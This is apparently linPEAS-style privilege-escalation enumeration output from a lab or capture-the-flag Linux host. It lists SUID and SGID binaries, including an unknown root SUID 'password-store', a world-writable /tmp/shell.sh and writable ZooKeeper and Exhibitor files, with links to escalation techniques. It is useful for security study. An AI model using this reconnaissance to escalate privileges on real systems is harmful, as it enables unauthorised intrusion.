+-rws--x--x 1 root root        17K Sep 10  2020 /usr/bin/password-store (Unknown SUID binary)
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root utmp     10K Feb 18  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root mail     19K Dec  3  2017 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root tty      15K May  4  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow   31K Jul 27  2018 /usr/bin/expiry
+-rwxr-sr-x 1 root shadow   71K Jul 27  2018 /usr/bin/chage
+-rwxr-sr-x 1 root tty      35K Jan 10  2019 /usr/bin/wall
+-rwxr-sr-x 1 root shadow   39K Feb 14  2019 /usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root crontab  43K Oct 11  2019 /usr/bin/crontab
+-rwxr-sr-x 1 root ssh     315K Jan 31  2020 /usr/bin/ssh-agent
+-rwsr-sr-x 1 root root     15K Aug 27  2020 /usr/lib/xorg/Xorg.wrap
+
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+Current: =
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Shell capabilities:
+0x0000000000000000=
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Files with capabilities (limited to 50):
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/ping = cap_net_raw+ep
+
+╔══════════╣ Users with capabilities
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/etc/security/capability.conf Not Found
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+╔══════════╣ Unexpected in root
+/vmlinuz.old
+/vmlinuz
+/initrd.img.old
+/lib32
+/zookeeper
+/initrd.img
+/libx32
+/lost+found
+
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 16
+drwxr-xr-x   2 root root 4096 Sep  9  2020 .
+drwxr-xr-x 120 root root 4096 Jun 18 10:07 ..
+-rw-r--r--   1 root root  664 Mar  1  2019 bash_completion.sh
+-rw-r--r--   1 root root 1945 Dec 27  2018 vte-2.91.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. No
+═╣ Can I read opasswd file? ............. No
+═╣ Can I write in network-scripts? ...... No
+═╣ Can I read root folder? .............. No
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/home/charles/tmp/nginx.log.556
+/root/
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/opt/zookeeper/zookeeper.out
+/home/charles/.gnupg/trustdb.gpg
+/home/charles/.gnupg/pubring.kbx
+/var/log/vmware-vmsvc.log
+/var/log/daemon.log
+/var/log/auth.log
+/var/log/syslog
+/tmp/hsperfdata_charles/24514
+/tmp/hsperfdata_charles/504
+
+╔══════════╣ Writable log files (logrotten) (limit 100)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+logrotate 3.14.0
+
+    Default mail command:       /usr/bin/mail
+    Default compress command:   /bin/gzip
+    Default uncompress command: /bin/gunzip
+    Default compress extension: .gz
+    Default state file path:    /var/lib/logrotate/status
+    ACL support:                yes
+    SELinux support:            yes
+Writable: /opt/zookeeper/src/contrib/loggraph/web/org/apache/zookeeper/graph/resources/loggraph.log.js
+
+╔══════════╣ Files inside /home/charles (limit 20)
+total 36
+drwxr-xr-x 5 charles charles 4096 Jun 18 11:48 .
+drwxr-xr-x 3 root    root    4096 Sep 10  2020 ..
+-rw-r--r-- 1 charles charles  220 Apr 18  2019 .bash_logout
+-rw-r--r-- 1 charles charles 3526 Apr 18  2019 .bashrc
+drwx------ 2 charles charles 4096 Jun 18 11:48 .gnupg
+drwxr-xr-x 3 charles charles 4096 Sep 10  2020 .java
+-rw-r--r-- 1 charles charles   33 Jun 18 10:09 local.txt
+-rw-r--r-- 1 charles charles  807 Apr 18  2019 .profile
+drwxr-xr-x 2 charles charles 4096 Jun 18 11:47 tmp
+
+╔══════════╣ Files inside others home (limit 20)
+
+╔══════════╣ Searching installed mail applications
+
+╔══════════╣ Mails (limit 50)
+
+╔══════════╣ Backup folders
+
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 root root 9716 Jul 24  2020 /usr/lib/modules/4.19.0-10-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 9716 Apr 27  2020 /usr/lib/modules/4.19.0-8-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 43736 Oct  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 5566 Jan 30  2019 /usr/lib/libreoffice/share/config/soffice.cfg/dbaccess/ui/backuppage.ui
+-rw-r--r-- 1 root root 35719 Nov  8  2018 /usr/lib/python2.7/dist-packages/samba/netcmd/domain_backup.py
+-rw-r--r-- 1 root root 26001 Sep 10  2020 /usr/lib/python2.7/dist-packages/samba/netcmd/domain_backup.pyc
+-rw-r--r-- 1 root root 5889 Sep 10  2020 /usr/lib/python2.7/dist-packages/samba/tests/ntacls_backup.pyc
+-rw-r--r-- 1 root root 24038 Nov  8  2018 /usr/lib/python2.7/dist-packages/samba/tests/domain_backup.py
+-rw-r--r-- 1 root root 20563 Sep 10  2020 /usr/lib/python2.7/dist-packages/samba/tests/domain_backup.pyc
+-rw-r--r-- 1 root root 6524 Sep  2  2019 /usr/lib/python2.7/dist-packages/samba/tests/ntacls_backup.py
+-rw-r--r-- 1 root root 1663 Nov 26  2018 /usr/share/man/man8/tdbbackup.tdbtools.8.gz
+-rw-r--r-- 1 root root 3307 Feb  8  2019 /usr/share/man/man1/nbackup.1.gz
+-rw-r--r-- 1 root root 194817 Nov 23  2016 /usr/share/doc/x11-common/changelog.Debian.old.gz
+-rwxr-xr-x 1 root root 1513 Oct 19  2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
+-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
+-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz
+-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz
+-rwxr-xr-x 1 root root 14328 Nov 26  2018 /usr/bin/tdbbackup.tdbtools
+-rwxr-xr-x 1 root root 309608 Feb  8  2019 /usr/bin/nbackup
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found: /etc/hddtemp.db: UTF-8 Unicode text
+Found: /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3027002
+ -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
+
+
+╔══════════╣ Web files?(output limit)
+/var/www/:
+total 12K
+drwxr-xr-x  3 root root 4.0K Sep 10  2020 .
+drwxr-xr-x 12 root root 4.0K Sep 10  2020 ..
+drwxr-xr-x  2 root root 4.0K Sep 10  2020 html
+
+/var/www/html:
+total 12K
+drwxr-xr-x 2 root root 4.0K Sep 10  2020 .
+drwxr-xr-x 3 root root 4.0K Sep 10  2020 ..
+
+╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-rw-r-- 1 charles charles 0 Feb 20  2014 /opt/zookeeper/src/java/generated/.generated
+-rw-r--r-- 1 charles charles 220 Apr 18  2019 /home/charles/.bash_logout
+-rw------- 1 charles charles 0 Sep 10  2020 /home/charles/.java/.userPrefs/.userRootModFile.charles
+-rw------- 1 charles charles 0 Sep 10  2020 /home/charles/.java/.userPrefs/.user.lock.charles
+-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
+-rw------- 1 root root 0 Sep  9  2020 /etc/.pwd.lock
+-rw-r--r-- 1 root root 0 Sep  9  2020 /etc/.java/.systemPrefs/.system.lock
+-rw-r--r-- 1 root root 0 Sep  9  2020 /etc/.java/.systemPrefs/.systemRootModFile
+-rw-r--r-- 1 root root 0 Oct 28  2020 /run/network/.ifstate.lock
+-r--r--r-- 1 root root 11 Oct 28  2020 /tmp/.X0-lock
+-rw-r--r-- 1 root root 2044 Jul 23  2020 /usr/lib/jvm/.java-1.11.0-openjdk-amd64.jinfo
+-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-r--r--r-- 1 root root 11 Oct 28  2020 /tmp/.X0-lock
+-rwxrwxrwx 1 charles charles 76 Jun 18 11:33 /tmp/shell.sh
+-rw------- 1 charles charles 32768 Jun 18 11:48 /tmp/hsperfdata_charles/24514
+-rw------- 1 charles charles 32768 Jun 18 11:48 /tmp/hsperfdata_charles/504
+-rw-r--r-- 1 root root 8633 Sep 10  2020 /var/backups/apt.extended_states.1.gz
+-rw-r--r-- 1 root root 195 Sep 10  2020 /var/backups/dpkg.diversions.1.gz
+-rw-r--r-- 1 root root 78969 Sep 28  2020 /var/backups/apt.extended_states.0
+-rw-r--r-- 1 root root 465 Sep 10  2020 /var/backups/dpkg.diversions.0
+-rw-r--r-- 1 root root 358679 Sep 28  2020 /var/backups/dpkg.status.1.gz
+-rw-r--r-- 1 root root 135 Sep 10  2020 /var/backups/dpkg.statoverride.0
+-rw-r--r-- 1 root root 1424318 Sep 28  2020 /var/backups/dpkg.status.0
+-rw-r--r-- 1 root root 102400 Jun 18 10:10 /var/backups/alternatives.tar.0
+-rw-r--r-- 1 root root 142 Sep 10  2020 /var/backups/dpkg.statoverride.1.gz
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/home/charles
+/opt/exhibitor
+/opt/exhibitor/exhibitor-1.0-jar-with-dependencies.jar
+/opt/exhibitor/exhibitor.properties
+/opt/zookeeper
+/opt/zookeeper/bin
+/opt/zookeeper/bin/README.txt
+/opt/zookeeper/bin/zkCleanup.sh
+/opt/zookeeper/bin/zkCli.cmd
+/opt/zookeeper/bin/zkCli.sh
+/opt/zookeeper/bin/zkEnv.cmd
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/build.xml
+/opt/zookeeper/CHANGES.txt
+/opt/zookeeper/conf
+/opt/zookeeper/conf/configuration.xsl
+/opt/zookeeper/conf/java.env
+/opt/zookeeper/conf/log4j.properties
+/opt/zookeeper/conf/zoo.cfg
+/opt/zookeeper/conf/zoo_sample.cfg
+/opt/zookeeper/contrib
+/opt/zookeeper/contrib/fatjar
+/opt/zookeeper/contrib/fatjar/build.xml
+/opt/zookeeper/contrib/fatjar/conf
+/opt/zookeeper/contrib/fatjar/conf/mainClasses
+/opt/zookeeper/contrib/fatjar/src
+/opt/zookeeper/contrib/fatjar/src/java
+/opt/zookeeper/contrib/fatjar/src/java/org
+/opt/zookeeper/contrib/fatjar/src/java/org/apache
+/opt/zookeeper/contrib/fatjar/src/java/org/apache/zookeeper
+/opt/zookeeper/contrib/fatjar/src/java/org/apache/zookeeper/util
+/opt/zookeeper/contrib/fatjar/src/java/org/apache/zookeeper/util/FatJarMain.java
+/opt/zookeeper/contrib/fatjar/zookeeper-3.4.6-fatjar.jar
+/opt/zookeeper/contrib/loggraph
+/opt/zookeeper/contrib/loggraph/build.xml
+/opt/zookeeper/contrib/loggraph/src
+/opt/zookeeper/contrib/loggraph/src/java
+/opt/zookeeper/contrib/loggraph/src/java/org
+/opt/zookeeper/contrib/loggraph/src/java/org/apache
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/FilterException.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/FilterOp.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/filterops
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/filterops/AndOp.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/filterops/Arg.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/filterops/EqualsOp.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/filterops/GreaterThanOp.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/filterops/LessThanOp.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/FilterParser.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/JsonGenerator.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/Log4JEntry.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/Log4JSource.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/LogEntry.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/FileLoader.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/Fs.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/GraphData.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/JsonServlet.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/NumEvents.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/TransactionEntry.java
+/opt/zookeeper/contrib/loggraph/src/java/org/apache/zookeeper/graph/TxnLogSource.java
+/opt/zookeeper/contrib/loggraph/zookeeper-3.4.6-loggraph.jar
+/opt/zookeeper/contrib/rest
+/opt/zookeeper/contrib/rest/zookeeper-3.4.6-rest.jar
+/opt/zookeeper/contrib/zkfuse
+/opt/zookeeper/contrib/zkfuse/build.xml
+/opt/zookeeper/contrib/zkfuse/configure.ac
+/opt/zookeeper/contrib/zkfuse/Makefile.am
+/opt/zookeeper/contrib/zkfuse/README.txt
+/opt/zookeeper/contrib/zkfuse/src
+/opt/zookeeper/contrib/zkfuse/src/blockingqueue.h
+/opt/zookeeper/contrib/zkfuse/src/doxygen.cfg
+/opt/zookeeper/contrib/zkfuse/src/event.cc
+/opt/zookeeper/contrib/zkfuse/src/event.h
+/opt/zookeeper/contrib/zkfuse/src/log4cxx.properties
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/zkfuse/VERSION
+/opt/zookeeper/contrib/zkperl
+/opt/zookeeper/contrib/zkperl/build
+/opt/zookeeper/contrib/zkperl/build/check_zk_version.c
+/opt/zookeeper/contrib/zkperl/build/check_zk_version.h
+/opt/zookeeper/contrib/zkperl/build.xml
+/opt/zookeeper/contrib/zkperl/Changes
+/opt/zookeeper/contrib/zkperl/LICENSE
+/opt/zookeeper/contrib/zkperl/Makefile.PL
+/opt/zookeeper/contrib/zkperl/MANIFEST
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/zkperl/t/10_invalid.t
+/opt/zookeeper/contrib/zkperl/t/15_thread.t
+/opt/zookeeper/contrib/zkperl/t/20_tie.t
+/opt/zookeeper/contrib/zkperl/t/22_stat_tie.t
+/opt/zookeeper/contrib/zkperl/t/24_watch_tie.t
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/zkperl/typemap
+/opt/zookeeper/contrib/zkperl/VERSION
+/opt/zookeeper/contrib/zkperl/ZooKeeper.pm
+/opt/zookeeper/contrib/zkperl/ZooKeeper.xs
+/opt/zookeeper/contrib/zkpython
+/opt/zookeeper/contrib/zkpython/build.xml
+/opt/zookeeper/contrib/zkpython/ivy.xml
+/opt/zookeeper/contrib/zkpython/README
+/opt/zookeeper/contrib/zkpython/src
+/opt/zookeeper/contrib/zkpython/src/c
+/opt/zookeeper/contrib/zkpython/src/c/pyzk_docstrings.h
+/opt/zookeeper/contrib/zkpython/src/c/zookeeper.c
+/opt/zookeeper/contrib/zkpython/src/examples
+/opt/zookeeper/contrib/zkpython/src/examples/README
+/opt/zookeeper/contrib/zkpython/src/examples/watch_znode_for_changes.py
+/opt/zookeeper/contrib/zkpython/src/packages
+/opt/zookeeper/contrib/zkpython/src/packages/deb
+/opt/zookeeper/contrib/zkpython/src/packages/deb/zkpython.control
+/opt/zookeeper/contrib/zkpython/src/packages/deb/zkpython.control/control
+/opt/zookeeper/contrib/zkpython/src/packages/rpm
+/opt/zookeeper/contrib/zkpython/src/packages/rpm/spec
+/opt/zookeeper/contrib/zkpython/src/packages/rpm/spec/zkpython.spec
+/opt/zookeeper/contrib/zkpython/src/python
+/opt/zookeeper/contrib/zkpython/src/python/setup.py
+/opt/zookeeper/contrib/zkpython/src/python/zk.py
+/opt/zookeeper/contrib/zkpython/src/test
+/opt/zookeeper/contrib/zkpython/src/test/acl_test.py
+/opt/zookeeper/contrib/zkpython/src/test/async_test.py
+/opt/zookeeper/contrib/zkpython/src/test/callback_test.py
+/opt/zookeeper/contrib/zkpython/src/test/clientid_test.py
+/opt/zookeeper/contrib/zkpython/src/test/close_deadlock_test.py
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/zkpython/VERSION
+/opt/zookeeper/contrib/zktreeutil
+/opt/zookeeper/contrib/zktreeutil/build.xml
+/opt/zookeeper/contrib/zktreeutil/configure.ac
+/opt/zookeeper/contrib/zktreeutil/Makefile.am
+/opt/zookeeper/contrib/zktreeutil/README.txt
+/opt/zookeeper/contrib/zktreeutil/src
+/opt/zookeeper/contrib/zktreeutil/src/Makefile.am
+/opt/zookeeper/contrib/zktreeutil/src/SimpleTree.h
+/opt/zookeeper/contrib/zktreeutil/src/ZkAdaptor.cc
+/opt/zookeeper/contrib/zktreeutil/src/ZkAdaptor.h
+/opt/zookeeper/contrib/zktreeutil/src/ZkTreeUtil.cc
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/zktreeutil/tests
+/opt/zookeeper/contrib/zktreeutil/tests/zk_sample.xml
+/opt/zookeeper/contrib/zktreeutil/VERSION
+/opt/zookeeper/contrib/ZooInspector
+/opt/zookeeper/contrib/ZooInspector/build.xml
+/opt/zookeeper/contrib/ZooInspector/config
+/opt/zookeeper/contrib/ZooInspector/config/defaultConnectionSettings.cfg
+/opt/zookeeper/contrib/ZooInspector/config/defaultNodeVeiwers.cfg
+/opt/zookeeper/contrib/ZooInspector/icons
+/opt/zookeeper/contrib/ZooInspector/lib
+/opt/zookeeper/contrib/ZooInspector/lib/jtoaster-1.0.4.jar
+/opt/zookeeper/contrib/ZooInspector/licences
+/opt/zookeeper/contrib/ZooInspector/licences/Apache Software Licence v2.0.txt
+/opt/zookeeper/contrib/ZooInspector/licences/epl-v10.html
+/opt/zookeeper/contrib/ZooInspector/src
+/opt/zookeeper/contrib/ZooInspector/src/java
+/opt/zookeeper/contrib/ZooInspector/src/java/org
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/encryption
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/encryption/BasicDataEncryptionManager.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/encryption/DataEncryptionManager.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/about.html
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer/NodeViewerACL.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer/NodeViewerData.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer/NodeViewerMetaData.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/NodeViewersChangeListener.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer/ZooInspectorNodeViewer.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorAboutDialog.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorConnectionPropertiesDialog.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorIconResources.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorNodeViewersDialog.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorNodeViewersPanel.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/logger
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/logger/LoggerFactory.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/manager
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/manager/NodeListener.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/manager/Pair.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/manager/ZooInspectorManagerImpl.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/manager/ZooInspectorManager.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/manager/ZooInspectorNodeManager.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/inspector/ZooInspector.java
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/retry
+/opt/zookeeper/contrib/ZooInspector/src/java/org/apache/zookeeper/retry/ZooKeeperRetry.java
+/opt/zookeeper/contrib/ZooInspector/zookeeper-3.4.6-ZooInspector.jar
+/opt/zookeeper/data
+/opt/zookeeper/dist-maven
+/opt/zookeeper/dist-maven/zookeeper-3.4.6.jar
+/opt/zookeeper/dist-maven/zookeeper-3.4.6.jar.asc
+/opt/zookeeper/dist-maven/zookeeper-3.4.6.jar.md5
+/opt/zookeeper/dist-maven/zookeeper-3.4.6.jar.sha1
+/opt/zookeeper/dist-maven/zookeeper-3.4.6-javadoc.jar
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs
+/opt/zookeeper/docs/api
+/opt/zookeeper/docs/api/allclasses-frame.html
+/opt/zookeeper/docs/api/allclasses-noframe.html
+/opt/zookeeper/docs/api/constant-values.html
+/opt/zookeeper/docs/api/deprecated-list.html
+/opt/zookeeper/docs/api/help-doc.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache
+/opt/zookeeper/docs/api/org/apache/zookeeper
+/opt/zookeeper/docs/api/org/apache/zookeeper/AsyncCallback.ACLCallback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/AsyncCallback.Children2Callback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/AsyncCallback.ChildrenCallback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/AsyncCallback.DataCallback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/AsyncCallback.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/AsyncCallback.ACLCallback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/AsyncCallback.Children2Callback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/AsyncCallback.ChildrenCallback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/AsyncCallback.DataCallback.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/class-use/AsyncCallback.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/client
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/class-use
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/class-use/FourLetterWordMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/FourLetterWordMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/client/package-use.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/CreateMode.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/ACL.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/ACL.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/Id.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/Stat.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/StatPersisted.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/class-use/StatPersistedV1.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/Id.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/data/package-use.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.APIErrorException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.AuthFailedException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.BadArgumentsException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.BadVersionException.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/KeeperException.CodeDeprecated.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use/LogFormatter.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use/PurgeTxnLog.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use/SnapshotFormatter.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/class-use/ZooKeeperServerMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/LogFormatter.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/package-use.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/class-use
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/class-use/QuorumPeerMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/package-frame.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/package-summary.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/package-tree.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/package-use.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/quorum/QuorumPeerMain.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/SnapshotFormatter.html
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade
+/opt/zookeeper/docs/api/org/apache/zookeeper/server/upgrade/class-use
